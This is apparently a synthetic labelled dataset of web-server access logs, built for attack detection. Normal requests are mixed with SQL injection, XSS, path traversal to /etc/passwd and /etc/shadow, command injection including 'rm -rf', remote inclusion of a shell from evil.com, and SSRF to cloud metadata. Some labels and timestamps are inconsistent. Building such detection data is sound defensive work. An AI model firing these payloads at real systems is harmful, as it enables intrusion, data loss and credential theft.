logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-06T15:43:14+09:00,192.168.1.165,GET,/signup,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,False,normal,2025-05-05T06:35:31+09:00,browser,https://www.facebook.com/
2025-05-01T17:07:39+09:00,192.168.0.55,GET,/css/style.css,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-02T14:00:02+09:00,browser,https://www.facebook.com/
2025-05-02T03:47:06+09:00,12.234.145.134,POST,/status?cmd=`id`,500,sqlmap/1.7.4#stable,True,command_injection,2025-05-02T03:36:33+09:00,script,-
2025-05-06T23:28:25+09:00,200.234.187.171,GET,/profile?bio=<img src=x onerror=alert(1337)>,200,Mozilla/5.0 (X11; Linux x86_64),True,xss,2025-05-12T20:24:28+09:00,browser,-
2025-05-12T20:23:00+09:00,78.110.173.65,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,Nikto/2.1.6 (Evasions:none),True,tls_probe,2025-05-04T20:29:50+09:00,pentest_tool,-
2025-05-07T13:09:59+09:00,52.215.201.56,GET,/home,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-08T01:30:09+09:00,browser,https://example.com/
2025-05-03T01:54:50+09:00,10.177.180.104,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-03T01:54:50+09:00,unknown,-
2025-05-04T07:27:20+09:00,80.79.222.60,GET,/include?template=http://evil.com/shell.txt,502,Nikto/2.5.0,True,ssrf_rfi,2025-05-08T20:35:20+09:00,script,-
2025-05-05T12:27:13+09:00,10.0.0.141,GET,/load?file=http://evil.com/shell.txt,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-01T17:31:52+09:00,browser,https://google.com/search?q=example
2025-05-14T00:27:34+09:00,192.168.0.87,GET,/home,200,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),False,normal,2025-05-06T20:50:09+09:00,crawler,-
2025-05-11T12:53:36+09:00,192.168.0.223,POST,/products/4.html?page=4,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T14:41:53+09:00,mobile_browser,https://twitter.com/
2025-05-11T19:12:11+09:00,240.114.90.35,GET,/index.php?page=../../../../etc/shadow%00,403,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-06T20:53:11+09:00,browser,-
2025-05-11T16:17:41+09:00,10.0.0.245,POST,/images/....//....//etc/passwd,500,curl/7.6,True,directory_traversal,2025-05-07T14:44:54+09:00,script,-
2025-05-03T12:42:21+09:00,10.0.0.89,POST,/images/....//....//etc/passwd,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",True,directory_traversal,2025-05-02T22:22:41+09:00,browser,-
2025-05-04T20:27:07+09:00,192.168.0.201,GET,/login,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-03T08:02:00+09:00,browser,https://twitter.com/
2025-05-13T12:40:03+09:00,192.168.0.15,GET,/js/app.js,200,curl/7.2,False,normal,2025-05-07T22:11:45+09:00,script,https://example.com/prev
2025-05-02T21:25:23+09:00,192.168.0.218,POST,/css/style.css?page=2,404,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-02T19:55:17+09:00,mobile_browser,https://twitter.com/
2025-05-09T00:03:18+09:00,192.168.0.156,GET,/css/style.css,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Edge/109.0,False,normal,2025-05-04T11:23:09+09:00,browser,https://www.facebook.com/
2025-05-06T16:40:38+09:00,10.0.0.80,GET,/product?id=10;DROP TABLE users,403,wpscan/3.8.23,True,sql_injection,2025-05-03T11:15:37+09:00,pentest_tool,-
2025-05-09T12:27:57+09:00,143.200.242.197,POST,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-01T18:49:14+09:00,browser,-
2025-05-01T22:15:08+09:00,128.205.36.232,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,500,OWASP ZAP,True,tls_probe,2025-05-03T19:59:19+09:00,pentest_tool,https://google.com/search?q=example
2025-05-14T21:41:41+09:00,10.0.0.88,GET,/product?id=10;DROP TABLE users,500,Nikto/2.1.6 (Evasions:none),True,sql_injection,2025-05-01T18:48:40+09:00,pentest_tool,-
2025-05-01T16:45:01+09:00,192.168.0.37,POST,/search?q=shoes,500,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T18:02:43+09:00,mobile_browser,https://www.facebook.com/
2025-05-10T00:21:06+09:00,192.168.0.103,POST,/home?page=1,200,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),False,normal,2025-05-06T14:37:14+09:00,crawler,https://www.facebook.com/
2025-05-01T15:52:08+09:00,10.0.0.19,GET,/../../../../etc/passwd,200,BurpSuite Community/2025.4,True,directory_traversal,2025-05-02T23:36:00+09:00,pentest_tool,-
2025-05-06T15:08:48+09:00,10.0.0.54,POST,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,200,BurpSuite Community/2025.4,True,command_injection,2025-05-06T19:39:36+09:00,pentest_tool,-
2025-05-04T12:07:59+09:00,10.0.0.239,POST,/images/....//....//etc/passwd,403,Nikto/2.1.6 (Evasions:none),True,directory_traversal,2025-05-03T22:54:33+09:00,pentest_tool,-
2025-05-11T00:14:58+09:00,10.0.0.212,POST,/images/....//....//etc/passwd,403,Metasploit/6.4,True,directory_traversal,2025-05-04T17:31:41+09:00,pentest_tool,https://google.com/search?q=example
2025-05-06T15:34:23+09:00,9.251.50.215,GET,/,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-14T13:34:45+09:00,browser,-
2025-05-08T08:44:06+09:00,50.250.169.112,GET,/images/../../../etc/passwd,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-05T15:04:23+09:00,browser,-
2025-05-01T20:16:47+09:00,100.43.177.26,GET,"/search?q=1' UNION SELECT username, password FROM users --",200,Mozilla/5.0,True,sql_injection,2025-05-07T20:30:45+09:00,browser,-
2025-05-09T04:01:35+09:00,252.158.178.32,GET,/profile?bio=<img src=x onerror=alert(1337)>,200,Mozilla/5.0 (X11; Linux x86_64),True,xss,2025-05-10T19:48:46+09:00,browser,-
2025-05-09T16:16:03+09:00,10.0.0.216,GET,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),True,xss,2025-05-06T10:19:23+09:00,crawler,-
2025-05-12T09:00:46+09:00,10.0.0.211,GET,/product?id=10;DROP TABLE users,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",True,sql_injection,2025-05-06T11:19:31+09:00,browser,https://bing.com/search?q=foo
2025-05-10T21:03:32+09:00,10.0.0.197,GET,/product%253Fid%253D10%253BDROP%2520TABLE%2520users,403,wget/1.4,True,sql_injection,2025-05-07T19:16:41+09:00,script,-
2025-05-05T17:54:51+09:00,172.16.0.109,GET,/login,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T10:57:51+09:00,mobile_browser,https://twitter.com/
2025-05-04T11:56:33+09:00,203.139.141.190,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,502,python-requests/2.25.1,True,ssrf_rfi,2025-05-14T07:32:21+09:00,script,-
2025-05-09T01:20:32+09:00,78.14.223.90,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,BurpSuite Community/2025.4,True,tls_probe,2025-05-07T17:24:31+09:00,pentest_tool,https://google.com/search?q=example
2025-05-07T00:30:58+09:00,192.168.0.2,POST,/login?page=3,304,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",False,normal,2025-05-01T14:44:57+09:00,browser,https://www.facebook.com/
2025-05-10T15:05:41+09:00,10.51.105.13,GET,/api/items?id=21&sort=asc,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",False,normal,2025-05-10T15:05:41+09:00,browser,-
2025-05-05T07:44:47+09:00,192.168.0.201,GET,/about,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T18:52:59+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-02T22:12:16+09:00,10.0.0.140,GET,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,Metasploit/6.4,True,xss,2025-05-02T11:20:53+09:00,pentest_tool,-
2025-05-08T20:28:18+09:00,10.249.177.246,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-08T20:28:18+09:00,unknown,-
2025-05-11T14:52:43+09:00,65.151.151.241,GET,/ping?host=8.8.8.8;rm+-rf+/tmp/*,500,python-requests/2.25.1,True,command_injection,2025-05-05T04:26:20+09:00,script,-
2025-05-08T06:07:07+09:00,203.113.157.238,GET,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-07T20:24:47+09:00,browser,-
2025-05-09T17:42:49+09:00,192.168.0.80,POST,/home,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-02T22:04:10+09:00,browser,https://bing.com/search?q=foo
2025-05-11T13:02:46+09:00,192.168.1.211,GET,/search?q=shoes,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",False,normal,2025-05-03T15:06:02+09:00,browser,https://example.com/prev
2025-05-11T13:08:51+09:00,192.168.0.152,GET,/js/app.js,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-02T23:03:18+09:00,browser,https://bing.com/search?q=foo
2025-05-03T07:09:20+09:00,250.138.90.211,GET,/home,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-07T07:28:46+09:00,browser,https://example.com/
2025-05-01T01:26:44+09:00,192.168.0.123,POST,/products,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",False,normal,2025-05-02T17:55:35+09:00,browser,-
2025-05-13T18:21:40+09:00,10.228.50.143,GET,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-11T06:06:40+09:00,browser,https://example.com/
2025-05-08T07:06:55+09:00,192.168.0.207,POST,/signup,200,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,normal,2025-05-04T10:11:22+09:00,crawler,https://bing.com/search?q=foo
2025-05-14T21:02:26+09:00,192.168.0.43,GET,/?page=3,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T15:28:10+09:00,mobile_browser,-
2025-05-12T21:43:28+09:00,192.168.0.178,POST,/search?q=shoes,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Edge/107.0,False,normal,2025-05-07T17:00:51+09:00,browser,https://example.com/prev
2025-05-13T13:21:27+09:00,10.0.0.162,GET,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,ssrf_rfi,2025-05-06T18:59:44+09:00,crawler,-
2025-05-13T17:58:10+09:00,10.0.0.65,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,curl/7.3,True,sql_injection,2025-05-04T12:12:34+09:00,script,https://twitter.com/
2025-05-03T12:03:14+09:00,10.0.0.48,POST,/search?q=<script>alert('x')</script>,403,wpscan/3.8.23,True,xss,2025-05-04T20:49:14+09:00,pentest_tool,-
2025-05-09T16:22:21+09:00,192.168.0.103,GET,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-07T13:54:51+09:00,browser,https://bing.com/search?q=foo
2025-05-08T00:01:44+09:00,201.74.187.225,POST,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-12T11:40:30+09:00,browser,https://example.com/
2025-05-01T19:44:10+09:00,78.191.208.36,POST,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-11T18:26:16+09:00,browser,-
2025-05-03T16:23:44+09:00,210.169.135.4,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",True,tls_probe,2025-05-05T14:23:10+09:00,browser,https://google.com/search?q=example
2025-05-07T07:56:38+09:00,224.165.119.146,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,502,Nikto/2.5.0,True,ssrf_rfi,2025-05-13T07:31:55+09:00,script,-
2025-05-02T01:22:14+09:00,10.0.0.231,POST,/admin/backup?file=config;echo+x,200,wget/1.6,True,command_injection,2025-05-02T16:23:38+09:00,script,-
2025-05-13T08:36:55+09:00,192.168.0.175,GET,/,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-07T18:53:03+09:00,browser,https://example.com/prev
2025-05-03T20:40:37+09:00,19.122.210.34,GET,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-06T22:37:49+09:00,browser,https://example.com/
2025-05-13T13:02:23+09:00,192.168.0.184,GET,/js/app.js,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-04T17:27:06+09:00,crawler,https://twitter.com/
2025-05-06T15:45:29+09:00,192.168.0.176,GET,/signup,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-07T09:59:11+09:00,browser,-
2025-05-13T07:28:42+09:00,10.0.0.19,POST,/images/....//....//etc/passwd,200,BurpSuite Community/2025.4,True,directory_traversal,2025-05-02T17:32:23+09:00,pentest_tool,-
2025-05-11T16:59:19+09:00,192.168.0.100,GET,/css/style.css?page=4,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",False,normal,2025-05-06T06:44:02+09:00,browser,https://example.com/prev
2025-05-10T15:45:57+09:00,10.0.0.70,GET,/product%253Fid%253D10%253BDROP%2520TABLE%2520users,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",True,sql_injection,2025-05-06T18:15:48+09:00,browser,-
2025-05-01T17:03:59+09:00,10.0.0.239,POST,/ping?host=8.8.8.8;cat+/etc/passwd,500,curl/7.0,True,command_injection,2025-05-05T12:23:09+09:00,script,-
2025-05-07T08:56:29+09:00,10.0.0.66,POST,/images/....//....//etc/passwd,200,python-requests/2.15,True,directory_traversal,2025-05-01T11:49:24+09:00,script,-
2025-05-10T07:13:12+09:00,192.168.0.207,POST,/home,200,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,normal,2025-05-05T21:50:24+09:00,crawler,https://www.facebook.com/
2025-05-10T00:00:31+09:00,192.168.0.230,GET,/login,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0,False,normal,2025-05-04T11:04:35+09:00,browser,https://www.facebook.com/
2025-05-04T07:24:59+09:00,192.168.0.16,POST,/about?page=3,404,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-04T13:02:16+09:00,mobile_browser,https://www.facebook.com/
2025-05-13T03:07:07+09:00,106.109.128.75,GET,/status?cmd=`id`,500,python-requests/2.25.1,True,command_injection,2025-05-09T09:02:39+09:00,script,-
2025-05-06T17:55:24+09:00,192.168.0.183,POST,/products/4.html,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",False,normal,2025-05-01T13:12:01+09:00,browser,https://example.com/prev
2025-05-02T17:54:17+09:00,192.168.0.28,POST,/,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",False,normal,2025-05-01T20:44:56+09:00,browser,https://google.com/search?q=example
2025-05-10T07:53:04+09:00,192.168.0.86,GET,/products,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Edge/101.0,False,normal,2025-05-07T13:55:47+09:00,browser,https://example.com/prev
2025-05-09T09:40:35+09:00,10.233.244.239,GET,/search?q=shoes&page=3,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",False,normal,2025-05-09T09:40:35+09:00,browser,https://search.example.com?q=shoes
2025-05-14T08:12:16+09:00,192.168.0.77,GET,/search?q=shoes,304,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",False,normal,2025-05-01T15:56:09+09:00,browser,https://bing.com/search?q=foo
2025-05-01T13:47:18+09:00,10.0.0.206,POST,/product%253Fid%253D10%253BDROP%2520TABLE%2520users,200,BurpSuite Community/2025.4,True,sql_injection,2025-05-04T07:57:12+09:00,pentest_tool,-
2025-05-06T22:23:03+09:00,192.168.0.90,GET,/search?q=shoes,304,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,False,normal,2025-05-06T14:05:47+09:00,browser,https://example.com/prev
2025-05-12T17:52:05+09:00,135.195.209.182,POST,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-05T02:16:49+09:00,browser,https://example.com/
2025-05-04T15:21:31+09:00,192.168.0.8,GET,/api/v1/user/35,302,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),False,normal,2025-05-07T14:27:49+09:00,crawler,-
2025-05-10T20:21:57+09:00,10.0.0.160,POST,/load?file=http://evil.com/shell.txt,404,wget/1.1,True,ssrf_rfi,2025-05-04T23:32:55+09:00,script,-
2025-05-02T15:40:40+09:00,192.168.0.218,GET,/api/v1/user/35,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-03T23:01:29+09:00,mobile_browser,https://google.com/search?q=example
2025-05-05T20:33:22+09:00,192.168.0.10,POST,/search?q=shoes,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",False,normal,2025-05-07T12:07:27+09:00,browser,https://bing.com/search?q=foo
2025-05-07T08:44:10+09:00,192.168.0.104,POST,/home,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T12:11:24+09:00,mobile_browser,https://example.com/prev
2025-05-06T00:31:54+09:00,10.0.0.255,POST,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,200,Metasploit/6.4,True,command_injection,2025-05-04T22:09:32+09:00,pentest_tool,https://bing.com/search?q=foo
2025-05-09T20:31:20+09:00,10.0.0.136,GET,/../../../../etc/passwd,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,True,directory_traversal,2025-05-03T23:18:39+09:00,browser,-
2025-05-04T15:43:31+09:00,10.0.0.18,GET,/search?q=<script>alert('x')</script>,200,wget/1.3,True,sql_injection,2025-05-04T14:09:23+09:00,script,-
2025-05-13T12:31:45+09:00,10.175.149.231,POST,/login?username=user294&password=pass9800,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",False,normal,2025-05-13T12:31:45+09:00,browser,https://example.com/
2025-05-11T16:16:55+09:00,10.0.0.49,GET,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,403,curl/8.7,True,ssrf_rfi,2025-05-07T19:59:11+09:00,script,-
2025-05-12T21:04:21+09:00,10.0.0.134,POST,/proxy%3Furl%3Dhttp%3A//169.254.169.254/latest/meta-data/,200,OWASP ZAP,True,ssrf_rfi,2025-05-02T22:04:26+09:00,pentest_tool,-
2025-05-08T11:08:41+09:00,205.31.94.135,GET,/product?id=5 OR 1=1;--,200,Mozilla/5.0,True,sql_injection,2025-05-08T09:44:45+09:00,browser,-
2025-05-02T22:11:12+09:00,10.0.0.243,POST,/../../../../etc/passwd,403,Metasploit/6.4,True,directory_traversal,2025-05-01T18:06:52+09:00,pentest_tool,-
2025-05-04T08:38:28+09:00,192.168.0.197,POST,/css/style.css,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",False,normal,2025-05-05T13:39:04+09:00,browser,https://twitter.com/
2025-05-07T17:18:09+09:00,10.0.0.105,POST,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Edge/101.0,True,command_injection,2025-05-07T22:30:21+09:00,browser,-
2025-05-06T12:53:32+09:00,192.168.1.186,GET,/search?q=shoes,200,curl/7.8,False,normal,2025-05-04T18:00:46+09:00,script,https://www.facebook.com/
2025-05-14T00:02:16+09:00,10.0.0.39,GET,/login.php%253Fusername%253Dadmin%2527%2520OR%2520%25271%2527%253D%25271%2527--%2526password%253Dpw,200,wpscan/3.8.23,True,sql_injection,2025-05-01T19:34:02+09:00,pentest_tool,-
2025-05-06T12:03:44+09:00,192.168.0.44,POST,/home,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",False,normal,2025-05-05T17:42:06+09:00,browser,https://bing.com/search?q=foo
2025-05-12T16:08:57+09:00,46.6.150.8,GET,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-13T16:20:00+09:00,browser,https://example.com/
2025-05-07T09:33:15+09:00,10.235.50.79,BADTLS,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-07T09:33:15+09:00,unknown,-
2025-05-05T17:09:00+09:00,10.0.0.203,POST,/images/....//....//etc/passwd,403,sqlmap/1.7#stable,True,directory_traversal,2025-05-04T14:26:50+09:00,pentest_tool,-
2025-05-03T00:35:46+09:00,192.168.0.113,POST,/about?page=2,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-02T18:43:56+09:00,crawler,https://www.facebook.com/
2025-05-03T09:10:07+09:00,10.248.50.221,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-03T09:10:07+09:00,unknown,-
2025-05-09T00:21:09+09:00,10.146.99.125,POST,/login?username=user645&password=pass3501,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",False,normal,2025-05-09T00:21:09+09:00,browser,-
2025-05-14T00:43:37+09:00,192.168.0.212,POST,/home,304,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-04T07:05:01+09:00,mobile_browser,-
